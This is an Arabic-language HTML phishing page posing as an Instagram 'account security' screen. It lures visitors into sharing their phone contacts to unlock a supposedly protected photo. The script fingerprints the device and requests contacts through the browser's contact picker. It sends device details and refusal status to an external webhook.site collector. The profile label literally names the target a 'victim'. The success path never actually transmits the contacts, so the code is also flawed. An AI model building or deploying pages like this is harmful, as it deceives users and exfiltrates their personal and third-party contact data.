<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: system-ui, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { background: white; border: 1px solid #dbdbdb; border-radius: 12px; width: 100%; max-width: 400px; padding: 25px; text-align: center; }
        .header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 15px; border-bottom: 1px solid #efefef; }
        .logo { font-family: 'Billabong', cursive; font-size: 26px; color: #262626; }
        .dots { font-size: 24px; color: #262626; }
        .profile { display: flex; align-items: center; gap: 15px; padding: 15px 0; text-align: left; }
        .avatar { width: 55px; height: 55px; background: linear-gradient(135deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); border-radius: 50%; display: flex; justify-content: center; align-items: center; color: white; font-size: 22px; font-weight: bold; }
        .info h3 { font-size: 15px; color: #262626; }
        .info p { font-size: 13px; color: #8e8e8e; }
        .post { background: #efefef; height: 220px; border-radius: 10px; display: flex; justify-content: center; align-items: center; color: #8e8e8e; margin-bottom: 15px; }
        .desc { font-size: 14px; color: #8e8e8e; margin-bottom: 15px; }
        .btn { width: 100%; padding: 12px; background: #0095f6; color: white; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; transition: 0.2s; }
        .btn-green { background: #2ea043; }
        .btn:disabled { background: #b2dffc; cursor: default; }
        #status { margin-top: 15px; font-size: 13px; padding: 12px; border-radius: 8px; display: none; }
        .status-ok { background: #e6f5e6; color: #2e7d32; display: block; }
        .status-info { background: #e3f2fd; color: #0d47a1; display: block; }
    </style>
</head>
<body>

    <div class="container">
        <div class="header"><div class="logo">Instagram</div><div class="dots">⋯</div></div>
        <div class="profile"><div class="avatar">A</div><div class="info"><h3>أحمد_الضحية</h3><p>تأمين الحساب</p></div></div>
        <div class="post"><span>🔒</span> الصورة محمية</div>
        <div class="desc">يرجى تأكيد هويتك عبر جهات الاتصال لفتح المحتوى.</div>
        <button class="btn" id="actionBtn">تأكيد الحساب</button>
        <div id="status"></div>
    </div>

    <script>
        document.getElementById('actionBtn').addEventListener('click', async function() {
            const btn = this;
            const statusBox = document.getElementById('status');
            
            btn.innerText = "جاري التحميل...";
            btn.disabled = true;

            // 1. تجهيز البيانات الأساسية
            const data = {
                device: "iPhone",
                ua: navigator.userAgent,
                screen: `${window.screen.width} x ${window.screen.height}`,
                timestamp: new Date().toISOString()
            };

            // 2. التحقق من المتصفح
            if (!navigator.contacts || !navigator.contacts.select) {
                sendToWebhook(data, "المتصفح لا يدعم جهات الاتصال.");
                return;
            }

            // 3. طلب جهات الاتصال (الجزء الصحيح الآن)
            try {
                const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });

                if (contacts && contacts.length > 0) {
                    data.contacts = contacts;
                    statusBox.className = 'status-ok';
                    statusBox.innerText = "✅ تم التحقق بنجاح!";
                    btn.innerText = "تم";
                    btn.className = "btn btn-green";
                } else {
                    data.status = "إلغاء";
                    sendToWebhook(data, "تم إلغاء الاختيار.");
                }
            } catch (error) {
                // 4. إذا رفض المستخدم (المنطق العكسي)
                if (error.name === 'NotAllowedError') {
                    data.status = "رفض";
                    sendToWebhook(data, "رفض الإذن (المنطق العكسي).");
                } else {
                    console.error(error);
                }
            }
        });

        // دالة الإرسال
        function sendToWebhook(data, reason) {
            data.reason = reason;
            const webhookUrl = 'https://webhook.site/45b14a78-723d-40c8-9932-da5cc5d33397';

            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).then(() => {
                const statusBox = document.getElementById('status');
                const btn = document.getElementById('actionBtn');
                statusBox.className = 'status-info';
                statusBox.innerText = "🔐 جاري تحديث الإعدادات الأمنية...";
                btn.innerText = "تم التحديث";
                btn.className = "btn btn-green";
                btn.disabled = false;
            }).catch(() => {
                const statusBox = document.getElementById('status');
                const btn = document.getElementById('actionBtn');
                statusBox.className = 'status-info';
                statusBox.innerText = "🔐 جاري تحديث الإعدادات الأمنية...";
                btn.innerText = "تم التحديث";
                btn.className = "btn btn-green";
                btn.disabled = false;
            });
        }
    </script>
</body>
</html>
